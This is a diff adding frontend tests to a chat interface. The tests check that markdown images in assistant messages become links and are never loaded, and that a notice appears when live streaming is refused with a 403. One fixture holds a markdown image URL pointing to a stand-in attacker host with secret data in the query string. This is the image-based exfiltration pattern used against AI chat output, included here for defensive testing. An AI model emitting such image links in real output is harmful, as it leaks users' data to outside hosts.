@@ -72,6 +72,21 @@ describe('views', () => {
     expect(container.querySelector('img')).toBeNull()
   })
 
+  it('never loads a remote image: it becomes a link labelled with the alt text', () => {
+    const text = 'Inline ![secret chart](https://evil.example/p?d=secret) here.\n\n![](https://evil.example/block.png)'
+    const { container } = render(<Message view={{ kind: 'assistant', id: 'a1', text, streaming: false }} answer={noAnswer} />)
+    expect(container.querySelector('img')).toBeNull()
+    expect(container.innerHTML).not.toMatch(/<img|srcset|background/i)
+    const inline = screen.getByRole('link', { name: /Image: secret chart/ })
+    expect(inline).toHaveAttribute('href', 'https://evil.example/p?d=secret')
+    expect(inline).toHaveAttribute('target', '_blank')
+    expect(inline.getAttribute('rel')).toMatch(/noreferrer/)
+    expect(screen.getByRole('link', { name: /Image: https:\/\/evil\.example\/block\.png/ })).toHaveAttribute(
+      'href',
+      'https://evil.example/block.png',
+    )
+  })
+
   it('typesets math', () => {
     const { container } = render(<Message view={{ kind: 'assistant', id: 'a1', text: 'Energy $E=mc^2$.', streaming: false }} answer={noAnswer} />)
     expect(container.querySelector('.katex')).not.toBeNull()
@@ -287,5 +302,26 @@ describe('action cards inside the list', () => {
     render(<Message view={{ kind: 'action', id: 'action:appr_1', action: approval }} answer={noAnswer} />)
     const group = screen.getByRole('group', { name: 'Approval needed' })
     expect(within(group).getAllByRole('button').map((b) => b.textContent)).toEqual(['Allow', 'Deny'])
+  })
+})
+
+describe('Conversation', () => {
+  it('shows a notice when the stream route refuses the chat (403)', async () => {
+    const { Conversation } = await import('@/ui/chat/Conversation')
+    vi.stubGlobal(
+      'fetch',
+      vi.fn(async (input: RequestInfo | URL) => {
+        const url = String(input)
+        if (url.includes('/items')) return Response.json({ object: 'list', data: [], first_id: null, last_id: null, has_more: false })
+        if (url.endsWith('/stream')) return Response.json({ error: 'forbidden' }, { status: 403 })
+        return Response.json({ error: 'forbidden' }, { status: 403 })
+      }),
+    )
+    try {
+      render(<Conversation sessionId="sess_x" />)
+      expect(await screen.findByText('Live updates are not available')).toBeInTheDocument()
+    } finally {
+      vi.unstubAllGlobals()
+    }
   })
 })
